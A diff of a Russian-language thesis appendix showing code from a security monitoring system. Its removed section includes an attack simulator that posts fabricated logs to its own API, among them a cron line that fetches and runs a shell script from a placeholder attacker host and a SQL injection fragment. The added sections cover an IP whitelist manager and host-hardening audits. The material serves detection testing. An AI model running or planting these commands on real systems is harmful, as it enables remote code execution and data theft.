@@ -1,239 +1,308 @@
-# Фрагменты программного кода системы мониторинга и защиты Mistral SOC
-
-Этот документ содержит ключевые фрагменты программного кода, используемые в дипломном проекте для реализации симулятора атак, механизмов аутентификации WebSocket и системных мониторов безопасности.
-
----
-
-## 1. Фрагмент программного кода генерации боевой нагрузки симулятора Mistral Demo
-Фрагмент Python-скрипта `attack_simulator.py`, реализующий пошаговую генерацию многовекторной атаки (APT сценарий) с имитацией сканирования портов, SSH брутфорса, SQL-инъекции, повышения привилегий и запуска шифровальщика с отправкой телеметрии и инцидентов на API Mistral Server.
-
-```python
-def run_apt_attack(step_by_step=False):
-    print_header()
-    print_color(f" [ MISTRAL APT ATTACK SIMULATION - {'ПОШАГОВЫЙ РЕЖИМ' if step_by_step else 'ЭКСПРЕСС-РЕЖИМ'} ]", "red")
-    print(f" Target: {BASE_URL}")
-    print(f" Attacker IP: {ATTACKER_IP}")
-    print()
-
-    # PHASE 1: Сбор информации (Reconnaissance)
-    print_color("\n=== [ФАЗА 1] СБОР ИНФОРМАЦИИ И СКАНИРОВАНИЕ ПОРТОВ (RECON) ===", "cyan")
-    simulate_progress(f"Сканирование сети с IP {ATTACKER_IP}", 2)
-    for i in range(1, 4):
-        api_request('/api/logs', {
-            'type': 'server', 
-            'level': 'warn', 
-            'message': f'[Firewall] Port scan detected from {ATTACKER_IP} - port check {i}/3'
-        })
-        time.sleep(0.4)
-    api_request('/api/incidents', {
-        'severity': 'LOW', 'monitor': 'NetworkMonitor', 'type': 'PORT_SCAN',
-        'description': f'Targeted port scan from {ATTACKER_IP}. Nmap SYN Stealth signature detected.'
-    })
-    
-    # PHASE 2: Подбор паролей SSH (Credential Access)
-    print_color("\n=== [ФАЗА 2] ПОПЫТКА СКОМПРОМЕТИРОВАТЬ SSH (BRUTE-FORCE) ===", "cyan")
-    simulate_progress("Выполнение Hydra SSH Brute-Force", 3)
-    for i in range(1, 6):
-        api_request('/api/logs', {
-            'type': 'server', 
-            'level': 'warn', 
-            'message': f'[SSH] Failed password for root from {ATTACKER_IP} port 4833{i} ssh2'
-        })
-        time.sleep(0.3)
-    api_request('/api/logs', {'type': 'server', 'level': 'error', 'message': f'[SSH] Successful login for root from {ATTACKER_IP}'})
-    api_request('/api/incidents', {
-        'severity': 'HIGH', 'monitor': 'AuthMonitor', 'type': 'SSH_BRUTE_FORCE_SUCCESS',
-        'description': f'Multiple failed SSH logins followed by a successful root session from {ATTACKER_IP}.'
-    })
-
-    # PHASE 3: Внедрение SQL-кода (Exploitation)
-    print_color("\n=== [ФАЗА 3] СКАНИРОВАНИЕ И ЭКСПЛУАТАЦИЯ WEB-УЯЗВИМОСТИ (SQLi) ===", "cyan")
-    simulate_progress("Обход WAF правил и внедрение SQL-полезной нагрузки", 3)
-    api_request('/api/logs', {'type': 'server', 'level': 'error', 'message': f"[WAF] Warning: Suspicious query payload from {ATTACKER_IP} matching rule SQLI_AUTH"})
-    api_request('/api/logs', {'type': 'server', 'level': 'error', 'message': "[DB] SQL Syntax error near 'UNION SELECT NULL, password FROM users--'"})
-    api_request('/api/incidents', {
-        'severity': 'HIGH', 'monitor': 'WafMonitor', 'type': 'SQL_INJECTION',
-        'description': f'Attacker {ATTACKER_IP} bypassed WAF rules and successfully executed SQL injection on /api/auth endpoint.'
-    })
-
-    # PHASE 4: Повышение привилегий (Privilege Escalation)
-    print_color("\n=== [ФАЗА 4] ПОВЫШЕНИЕ ПРИВИЛЕГИЙ И ЗАКРЕПЛЕНИЕ (PRIVILEGE ESCALATION) ===", "cyan")
-    simulate_progress("Загрузка и компиляция эксплоита DirtyPipe", 3)
-    api_request('/api/logs', {'type': 'server', 'level': 'error', 'message': f"[Audit] Unauthorized modification of /etc/shadow by UID=1002 from {ATTACKER_IP}"})
-    api_request('/api/logs', {'type': 'server', 'level': 'error', 'message': f"[Cron] New cron entry: '* * * * * curl http://{ATTACKER_IP}/shell | bash'"})
-    api_request('/api/incidents', {
-        'severity': 'CRITICAL', 'monitor': 'IntegrityMonitor', 'type': 'PRIVILEGE_ESCALATION',
-        'description': f'Kernel exploit executed from IP {ATTACKER_IP}. /etc/shadow modified. Malicious persistent cron job added.'
-    })
-
-    # PHASE 5: Шифрование данных (Impact / Ransomware)
-    print_color("\n=== [ФАЗА 5] НАНЕСЕНИЕ УЩЕРБА И ШИФРОВАНИЕ ДАННЫХ (RANSOMWARE) ===", "cyan")
-    send_metric_spike(100, 96, 99) # имитация критической загрузки CPU
-    simulate_progress("Массовое шифрование файлов в /var/www", 4)
-    for i in range(1, 6):
-        api_request('/api/logs', {'type': 'server', 'level': 'error', 'message': f'[Filemon] Mass encryption: /var/www/site_data_{i}.enc by attacker {ATTACKER_IP}'})
-        time.sleep(0.3)
-    
-    api_request('/api/incidents', {
-        'severity': 'CRITICAL', 'monitor': 'SystemMonitor', 'type': 'RANSOMWARE_ENCRYPTION',
-        'description': f'Massive file encryption in progress. Spiked CPU resources. IP: {ATTACKER_IP}. Ransom note dropped.'
-    })
-```
+# ПРИЛОЖЕНИЕ Г
+## Фрагменты программной реализации модулей защиты Mistral SOC
 
 ---
 
-## 2. Фрагмент программного кода валидации токена при установке WSS-соединения
-Фрагмент кода из Node.js сервера `server.js` (модуль `startWSS`), реализующий аутентификацию входящих WebSocket соединений с защитой от атак повторного воспроизведения (Replay Attack) через одноразовые числа (nonces) и проверку секретного токена авторизации.
+### 1. Фрагмент класса управления белыми списками (Whitelist Manager)
+
+Данный класс `WhitelistManager` на сервере Node.js отвечает за динамическое формирование белого списка сетевых адресов (IP и CIDR подсетей). Он автоматически исключает из возможных блокировок локальные адреса (loopback), адреса хостов активных SSH-сессий (определяемые через переменные окружения и утилиту `who`), а также IP-адреса, с которых в данный момент подключены веб-клиенты операторов безопасности SOC.
 
 ```javascript
-function startWSS(server) {
-  const wss = new WebSocket.Server({ server, path: "/ws" });
-  wss.on("connection", (ws, req) => {
-    const clientId = uuidv4();
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+class WhitelistManager {
+  constructor() {
+    this.staticWhitelist = BANNED_IP_WHITELIST; // Набор статических IP (Set)
+    this.cidrWhitelist = BANNED_IP_WHITELIST_CIDRS; // Набор CIDR диапазонов (Set)
+    this.activeSshSessions = ACTIVE_SSH_SESSIONS; // Активные сессии SSH (Set)
+  }
+
+  // Проверка валидности формата IPv4 или IPv6 адреса
+  isValidIp(ip) {
+    if (typeof ip !== "string") return false;
+    const trimmed = ip.trim();
+    const ipv4Pattern = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
+    const ipv6Pattern = /^(?:[A-Fa-f0-9]{1,4}:){7}[A-Fa-f0-9]{1,4}$|^(?:[A-Fa-f0-9]{1,4}:){1,7}:$|^:(?::[A-Fa-f0-9]{1,4}){1,7}$|^(?:[A-Fa-f0-9]{1,4}:){1,6}:[A-Fa-f0-9]{1,4}$/;
+    return ipv4Pattern.test(trimmed) || ipv6Pattern.test(trimmed);
+  }
+
+  // Проверка валидности формата IP-адреса или подсети CIDR
+  isValidIpOrCidr(val) {
+    if (typeof val !== "string") return false;
+    const trimmed = val.trim();
+    const cidrPattern = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\/(?:3[0-2]|[12]?[0-9])$|^[A-Fa-f0-9:]+\/(?:12[0-8]|1[01][0-9]|[1-9]?[0-9])$/;
+    return this.isValidIp(trimmed) || cidrPattern.test(trimmed);
+  }
+
+  // Проверка возможности применения блокировки (запрет бана доверенных IP)
+  isIpBannable(ip) {
+    if (!ip) return false;
     
-    // Инициализация неавторизованного клиента в сессии
-    clients.set(ws, { id: clientId, ip, authenticated: false });
-    addLog("server", "info", "WS client connected (awaiting auth)", { clientId, ip });
+    const normalizedTarget = ip.replace(/^::ffff:/, "").trim().toLowerCase();
+    
+    // Защита от блокировки локального интерфейса (Loopback)
+    if (
+      normalizedTarget === "127.0.0.1" || 
+      normalizedTarget === "localhost" || 
+      normalizedTarget === "::1" || 
+      normalizedTarget === "0.0.0.0" || 
+      normalizedTarget === "::" ||
+      normalizedTarget.startsWith("127.")
+    ) {
+      logger.info(`[IP-Blocker] Block skipped: 127.0.0.1/loopback cannot be banned.`);
+      return false;
+    }
+    
+    // Проверка нахождения в статическом белом списке
+    if (this.staticWhitelist.has(normalizedTarget)) {
+      logger.info(`IP Ban skipped: ${ip} is whitelisted (unbannable list / active SSH connection)`);
+      return false;
+    }
 
-    // Тайм-аут на прохождение аутентификации (10 секунд)
-    const authTimer = setTimeout(() => {
-      if (!clients.get(ws)?.authenticated) { 
-        ws.close(4001, "Auth timeout"); 
+    // Проверка соответствия белым диапазонам подсетей CIDR
+    for (const cidr of this.cidrWhitelist) {
+      if (ipInCidr(normalizedTarget, cidr)) {
+        logger.info(`IP Ban skipped: ${ip} matches whitelisted CIDR range: ${cidr}`);
+        return false;
       }
-    }, 10000);
+    }
+    
+    // Предотвращение блокировки активных операторов Desktop UI (защита от lockout)
+    const connectedIps = Array.from(clients.values()).map(c => c.ip ? c.ip.replace(/^::ffff:/, "").trim() : "");
+    if (connectedIps.includes(normalizedTarget)) {
+      logger.warn(`IP Ban skipped: ${ip} is associated with an active operator session to prevent lockout.`);
+      return false;
+    }
+    
+    return true;
+  }
 
-    ws.on("message", async (raw) => {
+  // Обновление белых списков на основе конфигурации и SSH-сессий хоста
+  updateSshAndFileWhitelist() {
+    const os = require("os");
+    const fs = require("fs");
+    const { exec } = require("child_process");
+
+    logger.info("[IP-Whitelist] Initializing IP exclusions & connected SSH devices whitelist...");
+
+    // Чтение статического белого списка из JSON-файла исключений
+    const whitelistFile = path.join(__dirname, "..", "data", "unbannable_ips.json");
+    if (fs.existsSync(whitelistFile)) {
       try {
-        const msg = JSON.parse(raw.toString());
-        const client = clients.get(ws);
+        const fileIps = JSON.parse(fs.readFileSync(whitelistFile, "utf8"));
+        fileIps.forEach(item => {
+          if (typeof item === "string" && item.trim()) {
+            const trimmed = item.trim().toLowerCase();
+            if (trimmed.includes("/")) {
+              this.cidrWhitelist.add(trimmed);
+            } else {
+              this.staticWhitelist.add(trimmed);
+            }
+          }
+        });
+        logger.info(`[IP-Whitelist] Loaded ${fileIps.length} static IP/CIDR exclusions from ${whitelistFile}`);
+      } catch (e) {
+        logger.error(`[IP-Whitelist] Failed to parse whitelist exclusions: ${e.message}`);
+      }
+    }
 
-        // Обработка запроса аутентификации
-        if (msg.event === "auth") {
-          const { token, nonce, username } = msg.data || {};
-          
-          if (!token || !nonce) { 
-            ws.send(JSON.stringify({ event: "auth_error", data: { error: "Missing token or nonce" } })); 
-            return; 
+    // Автоматический белый список адреса запуска сессии
+    const sshConnection = process.env.SSH_CONNECTION || process.env.SSH_CLIENT;
+    if (sshConnection) {
+      const parts = sshConnection.trim().split(/\s+/);
+      const clientIp = parts[0];
+      if (clientIp) {
+        const cleanIp = clientIp.replace(/^::ffff:/, "");
+        this.staticWhitelist.add(cleanIp);
+        this.activeSshSessions.add(cleanIp);
+      }
+    }
+
+    // Парсинг вывода команды 'who' для сбора IP-адресов текущих терминалов
+    exec("who", (err, stdout) => {
+      if (!err && stdout) {
+        const lines = stdout.split("\n");
+        lines.forEach(line => {
+          const match = line.match(/\(([^)]+)\)/);
+          if (match) {
+            const ip = match[1].trim();
+            if (ip && !ip.startsWith(":") && (ip.includes(".") || ip.includes(":"))) {
+              const cleanIp = ip.replace(/^::ffff:/, "");
+              this.staticWhitelist.add(cleanIp);
+              this.activeSshSessions.add(cleanIp);
+            }
           }
-          
-          // Защита от Replay-атаки: проверка уникальности nonce
-          if (usedNonces.has(nonce)) { 
-            ws.close(4002, "Replay detected"); 
-            return; 
-          }
-          
-          // Валидация криптографического токена доступа
-          if (token === WSS_SECRET_TOKEN) {
-            usedNonces.add(nonce);
-            client.authenticated = true;
-            client.username = username || "admin";
-            client.connectedAt = new Date().toISOString();
-            clearTimeout(authTimer);
-            
-            // Отправка подтверждения успешного входа
-            ws.send(JSON.stringify({ 
-              event: "auth_success", 
-              data: { clientId, model: activeModel, clientIp: ip, username: client.username, connectedAt: client.connectedAt } 
-            }));
-            
-            addLog("server", "info", `WS client authenticated: ${client.username}`, { clientId, ip });
-            
-            // Синхронизация текущего состояния системы с клиентом (инциденты, логи, карантин)
-            ws.send(JSON.stringify({ event: "active_connections", data: getActiveConnectionsList() }));
-            broadcast({ event: "active_connections", data: getActiveConnectionsList() });
-            ws.send(JSON.stringify({ event: "stats", data: { ...db.getStats(), connectedClients: clients.size } }));
-            ws.send(JSON.stringify({ event: "incidents_list", data: incidents.slice(0, 100) }));
-            ws.send(JSON.stringify({ event: "logs_list", data: serverLogs.slice(0, 200) }));
-            ws.send(JSON.stringify({ event: "quarantine_updated", data: db.getQuarantinedIps() }));
-            ws.send(JSON.stringify({ event: "soar_settings_updated", data: soarSettings }));
-          } else {
-            ws.send(JSON.stringify({ event: "auth_error", data: { error: "Invalid token" } }));
-          }
-        }
-      } catch (err) {
-        logger.error('WS auth/message processing error', err);
+        });
       }
     });
-  });
+  }
 }
 ```
 
 ---
 
-## 3. Фрагмент Lua-скрипта мониторинга системного журнала аутентификации (`monitor_auth.lua`)
-Скрипт собирает информацию о текущих сессиях терминалов (`who`), действиях `sudo` из `journalctl`, неудавшихся попытках входа по SSH и контролирует целостность файла `authorized_keys`. При обнаружении аномалий отправляет алерты и регистрирует инциденты информационной безопасности.
+### 2. Фрагмент программной реализации подсистемы Startup Active Defense (контроль целостности и ограничение прав)
 
-```lua
--- Функция сбора неудачных попыток входа из журнала systemd-journald
-function get_failed_logins()
-    local out = read_cmd("journalctl _COMM=sshd --since '10 minutes ago' -q --no-pager 2>/dev/null")
-    local failed = {}
-    for line in out:gmatch("[^\n]+") do
-        if line:find("Failed password") or line:find("Invalid user") then
-            local ip = line:match("from%s+(%S+)") or "127.0.0.1"
-            table.insert(failed, {ip = ip, line = line:sub(-120)})
-        end
-    end
-    return failed
-end
+Данная подсистема решает две задачи при запуске сервера:
+1. **Контроль целостности и ограничение прав доступа (`auditSelfPermissions`)**: вычисляет криптографические контрольные суммы файлов конфигурации (SHA-256) и сверяет их с эталоном. В среде Linux принудительно ограничивает права доступа к конфиденциальным файлам (до `0600` — только чтение и запись владельцу), предотвращая чтение секретов другими пользователями ОС.
+2. **Аудит безопасности хоста (`performStartupHardeningAudit`)**: проверяет статус межсетевого экрана (UFW), анализирует небезопасные конфигурации SSH (например, `PermitRootLogin yes`) и параметры ядра sysctl (ASLR, ptrace scope, пересылку пакетов), немедленно создавая инциденты безопасности при отклонениях от эталонного состояния.
 
--- Функция проверки целостностиauthorized_keys для предотвращения несанкционированного закрепления в ОС
-function get_ssh_keys_info()
-    local f = io.open(os.getenv("HOME") .. "/.ssh/authorized_keys", "r")
-    if not f then return nil end
-    local data = f:read("*a")
-    f:close()
-    return {size = #data, lines = select(2, data:gsub("\n", "\n"))}
-end
+```javascript
+// Модуль контроля целостности агента и ограничения прав на конфигурационные файлы
+function auditSelfPermissions() {
+  const os = require("os");
+  const fs = require("fs");
+  const crypto = require("crypto");
+  
+  // Файлы, критичные для работы и безопасности SOC-сервера
+  const targetFiles = [
+    path.join(__dirname, "..", ".env"),
+    path.join(__dirname, "..", "data", "soar_settings.json"),
+    path.join(__dirname, "db.js"),
+    path.join(__dirname, "server.js")
+  ];
 
--- Модуль выявления аномалий информационной безопасности
-function check_anomalies(data, prev_keys)
-    local anomalies = {}
-    
-    -- 1. Выявление активных сессий суперпользователя (root)
-    local root_sessions = {}
-    for _, s in ipairs(data.ssh_sessions) do
-        if s.user == "root" then table.insert(root_sessions, s) end
-    end
-    if #root_sessions > 0 then
-        local ips = {}
-        for _, s in ipairs(root_sessions) do table.insert(ips, s.ip) end
-        table.insert(anomalies, {
-            severity = "CRITICAL",
-            type = "ROOT_SSH",
-            description = "ROOT sessions active: " .. #root_sessions .. " (IP: " .. table.concat(ips, ", ") .. ")"
-        })
-    end
+  logger.info("[Self-Protection] Auditing configuration & agent file integrity...");
 
-    -- 2. Обнаружение брутфорса (превышение лимита неудачных авторизаций)
-    if #data.failed_logins > MAX_FAILED then
-        local ip_counts = {}
-        for _, f in ipairs(data.failed_logins) do
-            ip_counts[f.ip] = (ip_counts[f.ip] or 0) + 1
-        end
-        local top_ip, top_count = nil, 0
-        for ip, c in pairs(ip_counts) do
-            if c > top_count then top_ip, top_count = ip, c end
-        end
-        table.insert(anomalies, {
-            severity = "HIGH",
-            type = "FAILED_LOGINS",
-            description = "Неудачных входов: " .. #data.failed_logins .. " (лидер IP " .. (top_ip or "?") .. ": " .. top_count .. ")"
-        })
-    end
+  const integrityPath = path.join(__dirname, "..", "data", "integrity_hashes.json");
+  let integrityHashes = {};
+  if (fs.existsSync(integrityPath)) {
+    try {
+      integrityHashes = JSON.parse(fs.readFileSync(integrityPath, "utf8"));
+    } catch (e) {
+      logger.error("Failed to read integrity hashes", { err: e.message });
+    }
+  }
 
-    -- 3. Детектирование несанкционированного изменения авторизованных ключей
-    if prev_keys and data.keys_info then
-        if prev_keys.size ~= data.keys_info.size then
-            table.insert(anomalies, {
-                severity = "CRITICAL",
-                type = "AUTH_KEYS_CHANGED",
-                description = "authorized_keys изменён! Прежний размер: " .. prev_keys.size .. ", новый: " .. data.keys_info.size
-            })
-        end
-    end
+  let hashesChanged = false;
 
-    return anomalies
-end
+  targetFiles.forEach(filepath => {
+    if (!fs.existsSync(filepath)) return;
+    const filename = path.basename(filepath);
+
+    // 1. Ограничение прав доступа (Unix Permissions Lockdown)
+    if (os.platform() !== "win32") {
+      try {
+        const stats = fs.statSync(filepath);
+        const mode = stats.mode;
+        // Если группа или другие пользователи имеют права на чтение/запись/исполнение (маска 077)
+        if ((mode & 0o077) !== 0) {
+          logger.warn(`[Self-Protection] Insecure permissions detected on ${filename}. Locking down to 0600...`);
+          fs.chmodSync(filepath, 0o600); // 0600 - права чтения/записи владельцу
+          addIncident(
+            "HIGH",
+            "SelfProtection",
+            "INSECURE_FILE_PERMISSIONS",
+            `Обнаружены небезопасные права доступа на критический файл: ${filename}. Права автоматически изменены на 0600.`,
+            { filepath, originalMode: (mode & 0o777).toString(8), correctedMode: "600" }
+          );
+        }
+      } catch (e) {
+        logger.error(`[Self-Protection] Failed to correct permissions for ${filepath}: ${e.message}`);
+      }
+    }
+
+    // 2. Контроль целостности на основе хэш-сумм (SHA-256)
+    try {
+      const fileBuffer = fs.readFileSync(filepath);
+      const hash = crypto.createHash("sha256").update(fileBuffer).digest("hex");
+      
+      const oldHash = integrityHashes[filename];
+      if (!oldHash) {
+        integrityHashes[filename] = hash;
+        hashesChanged = true;
+        logger.info(`[Self-Protection] Saved baseline hash for ${filename}`);
+      } else if (oldHash !== hash) {
+        logger.warn(`[Self-Protection] File integrity violation detected for ${filename}!`);
+        addIncident(
+          "CRITICAL",
+          "SelfProtection",
+          "SELF_TAMPERING_ATTEMPT",
+          `НАРУШЕНИЕ ЦЕЛОСТНОСТИ АГЕНТА! Обнаружено изменение содержимого файла ${filename}.`,
+          { filepath, oldHash, newHash: hash }
+        );
+        integrityHashes[filename] = hash;
+        hashesChanged = true;
+      }
+    } catch (e) {
+      logger.error(`[Self-Protection] Failed to verify integrity hash for ${filepath}: ${e.message}`);
+    }
+  });
+
+  if (hashesChanged) {
+    try {
+      fs.writeFileSync(integrityPath, JSON.stringify(integrityHashes, null, 2), "utf8");
+    } catch (e) {
+      logger.error("Failed to save integrity hashes", { err: e.message });
+    }
+  }
+}
+
+// Запуск первичного аудита защищенности хоста и проверка ядра sysctl
+function performStartupHardeningAudit() {
+  const os = require("os");
+  const fs = require("fs");
+  const { exec } = require("child_process");
+  logger.info("[Startup Audit] Running Host Hardening compliance check...");
+
+  // Контроль прав и хэш-сумм файлов агента
+  auditSelfPermissions();
+  
+  if (os.platform() === "linux") {
+    // Аудит состояния межсетевого экрана (UFW)
+    exec("sudo ufw status", (err, stdout) => {
+      if (err || !stdout.includes("Status: active")) {
+        addIncident(
+          "HIGH",
+          "StartupAudit",
+          "FIREWALL_DISABLED",
+          "Внимание: Брандмауэр UFW отключен на хосте. Все входящие порты открыты!",
+          { reason: "UFW is inactive. Recommended mitigation: run 'sudo ufw enable'." }
+        );
+      }
+    });
+
+    // Аудит конфигурации безопасности SSH-демона
+    if (fs.existsSync("/etc/ssh/sshd_config")) {
+      try {
+        const sshConf = fs.readFileSync("/etc/ssh/sshd_config", "utf8");
+        if (sshConf.match(/^\s*PermitRootLogin\s+yes/m)) {
+          addIncident(
+            "HIGH",
+            "StartupAudit",
+            "SSH_INSECURE_CONFIGURATION",
+            "Конфигурация SSH: Разрешен вход суперпользователя Root по паролю (PermitRootLogin yes)",
+            { recommendation: "Change PermitRootLogin to 'no' in /etc/ssh/sshd_config." }
+          );
+        }
+      } catch (e) {
+        logger.error("[Startup Audit] Failed to read SSH config", { err: e.message });
+      }
+    }
+
+    // Аудит укрепления параметров ядра Linux (Hardening sysctl)
+    const sysctlChecks = [
+      { path: "/proc/sys/kernel/randomize_va_space", expected: "2", type: "ASLR_DISABLED", desc: "Рандомизация адресного пространства (ASLR) отключена." },
+      { path: "/proc/sys/kernel/yama/ptrace_scope", expected: "1", type: "PTRACE_SCOPE_INSECURE", desc: "Небезопасный доступ ptrace: процессы могут читать память соседних процессов." },
+      { path: "/proc/sys/net/ipv4/ip_forward", expected: "0", type: "IP_FORWARDING_ENABLED", desc: "Включена переадресация IP-пакетов (IP Forwarding)." }
+    ];
+
+    sysctlChecks.forEach(check => {
+      if (fs.existsSync(check.path)) {
+        try {
+          const value = fs.readFileSync(check.path, "utf8").trim();
+          if (value !== check.expected) {
+            addIncident(
+              "HIGH",
+              "KernelHardening",
+              check.type,
+              `Нарушение безопасности ядра: ${check.desc} (Ожидалось: ${check.expected}, найдено: ${value})`,
+              { path: check.path, value, expected: check.expected }
+            );
+          }
+        } catch (e) {
+          logger.error(`[Startup Audit] Failed to read kernel param ${check.path}`, { err: e.message });
+        }
+      }
+    });
+  }
+}
 ```
